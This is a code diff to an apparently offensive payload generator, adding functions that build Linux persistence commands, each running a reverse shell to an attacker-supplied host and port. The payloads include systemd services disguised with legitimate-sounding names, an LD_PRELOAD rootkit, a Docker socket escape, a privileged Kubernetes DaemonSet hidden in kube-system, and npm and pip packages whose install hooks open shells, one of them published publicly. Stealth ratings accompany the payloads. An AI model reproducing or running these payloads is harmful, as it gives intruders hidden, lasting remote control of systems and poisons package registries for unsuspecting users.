@@ -514,3 +514,74 @@ export function buildExtendedWindowsPersistence(lhost: string, lport: string, cm
     },
   ];
 }
+
+export function buildSystemdPersistence(lhost: string, lport: string): PersistencePayload[] {
+  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+  return [
+    { technique:"systemd user service (no root)", category:"linux", stealth:5,
+      command:`mkdir -p ~/.config/systemd/user/ && cat > ~/.config/systemd/user/dbus-sync.service << 'EOF'\n[Unit]\nDescription=D-Bus Sync Service\nAfter=default.target\n[Service]\nType=simple\nExecStart=/bin/bash -c '${cmd}'\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\nEOF\nsystemctl --user enable dbus-sync 2>/dev/null; systemctl --user start dbus-sync 2>/dev/null; loginctl enable-linger $USER 2>/dev/null`,
+      notes:"User-space systemd service — no root. loginctl enable-linger survives logout. Restarts every 30s." },
+    { technique:"systemd system service (root)", category:"linux", stealth:5,
+      command:`cat > /etc/systemd/system/systemd-networkd-resolver.service << 'EOF'\n[Unit]\nDescription=Network Resolver Cache\nAfter=network.target\n[Service]\nType=simple\nExecStart=/bin/bash -c '${cmd}'\nRestart=always\nRestartSec=60\nKillMode=none\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload 2>/dev/null; systemctl enable systemd-networkd-resolver 2>/dev/null; systemctl start systemd-networkd-resolver 2>/dev/null`,
+      notes:"Root systemd service named to blend with real systemd services. KillMode=none prevents child kill on stop." },
+  ];
+}
+
+export function buildLdPreloadPersistence(lhost: string, lport: string): PersistencePayload[] {
+  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+  return [
+    { technique:"LD_PRELOAD rootkit via /etc/ld.so.preload (root)", category:"linux", stealth:5,
+      command:`cat > /tmp/nx_hook.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid __attribute__((constructor)) nx_init(void){\n  if(fork()==0){setsid();system("${cmd}");exit(0);}}\nEOF\ngcc -shared -fPIC -nostartfiles -o /lib/libnss_nx.so.2 /tmp/nx_hook.c 2>/dev/null && echo /lib/libnss_nx.so.2 >> /etc/ld.so.preload && rm /tmp/nx_hook.c`,
+      notes:"LD_PRELOAD via /etc/ld.so.preload — constructor fires on every new process. Rootkit-level persistence. Requires root." },
+    { technique:"LD_PRELOAD per-user via .bashrc", category:"linux", stealth:4,
+      command:`cat > /tmp/nx_h.c << 'EOF'\n#include <stdlib.h>\n#include <unistd.h>\nvoid __attribute__((constructor)) nx_init(void){unsetenv("LD_PRELOAD");if(fork()==0){setsid();system("${cmd}");exit(0);}}\nEOF\ngcc -shared -fPIC -nostartfiles -o ~/.config/.libnx.so /tmp/nx_h.c 2>/dev/null && echo 'export LD_PRELOAD=~/.config/.libnx.so' >> ~/.bashrc && rm /tmp/nx_h.c`,
+      notes:"User-level LD_PRELOAD injected via shell profile. Fires on every interactive shell." },
+  ];
+}
+
+export function buildDockerSocketPersistence(lhost: string, lport: string): PersistencePayload[] {
+  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+  return [
+    { technique:"Docker socket container escape + host cron", category:"linux", stealth:3,
+      command:`docker -H unix:///var/run/docker.sock run --rm -v /:/host --privileged alpine sh -c "echo '* * * * * root ${cmd}' >> /host/etc/cron.d/nx && chmod 644 /host/etc/cron.d/nx" 2>/dev/null`,
+      notes:"Docker socket → privileged container with host / mount → writes cron to host filesystem. Persistent root shell." },
+    { technique:"Docker container implant + restart always", category:"linux", stealth:4,
+      command:`docker run -d --name "kube-proxy" --restart always --net=host --pid=host --privileged -v /:/host alpine /bin/sh -c "while true; do ${cmd} 2>/dev/null; sleep 30; done" 2>/dev/null`,
+      notes:"Persistent container named 'kube-proxy' — blends with K8s. restart=always survives host reboot." },
+  ];
+}
+
+export function buildK8sPersistence(lhost: string, lport: string): PersistencePayload[] {
+  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+  return [
+    { technique:"K8s DaemonSet (runs on every node)", category:"linux", stealth:4,
+      command:`kubectl apply -f - << 'EOF'\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-monitor\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: node-monitor\n  template:\n    metadata:\n      labels:\n        app: node-monitor\n    spec:\n      hostPID: true\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n      containers:\n      - name: monitor\n        image: alpine:latest\n        command: ["/bin/sh","-c","while true; do ${cmd} 2>/dev/null; sleep 60; done"]\n        securityContext:\n          privileged: true\nEOF`,
+      notes:"DaemonSet in kube-system namespace named 'node-monitor' — runs on ALL nodes. Privileged + host PID/network." },
+  ];
+}
+
+export function buildNpmPipPersistence(lhost: string, lport: string): PersistencePayload[] {
+  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+  return [
+    { technique:"npm package post-install hook (supply chain)", category:"linux", stealth:5,
+      command:`_D=$(mktemp -d); echo '{"name":"@nx/utils","version":"1.0.0","scripts":{"postinstall":"node -e \\"require('"'"'child_process'"'"').exec('"'"'${cmd}'"'"')\""}}' > "$_D/package.json"; cd "$_D" && npm publish --access public 2>/dev/null`,
+      notes:"npm package with postinstall hook fires on every npm install. Classic supply chain attack." },
+    { technique:"pip package post-install hook", category:"linux", stealth:5,
+      command:`_D=$(mktemp -d); mkdir -p "$_D/nx_util"; echo 'pass' > "$_D/nx_util/__init__.py"; printf 'from setuptools import setup\nimport subprocess\nsubprocess.Popen(["bash","-c","${cmd}"])\nsetup(name="nx-utils",version="1.0.0",packages=["nx_util"])' > "$_D/setup.py"; cd "$_D" && pip install . 2>/dev/null`,
+      notes:"Python pip setup.py fires reverse shell on install via subprocess.Popen." },
+  ];
+}
+
+export function buildAllPersistencePayloads(lhost: string, lport: string, cmd: string): PersistencePayload[] {
+  return [
+    ...buildLinuxPersistence(lhost, lport, cmd),
+    ...buildWindowsPersistence(lhost, lport, cmd),
+    ...buildExtendedLinuxPersistence(lhost, lport, cmd),
+    ...buildExtendedWindowsPersistence(lhost, lport, cmd),
+    ...buildSystemdPersistence(lhost, lport),
+    ...buildLdPreloadPersistence(lhost, lport),
+    ...buildDockerSocketPersistence(lhost, lport),
+    ...buildK8sPersistence(lhost, lport),
+    ...buildNpmPipPersistence(lhost, lport),
+  ];
+}
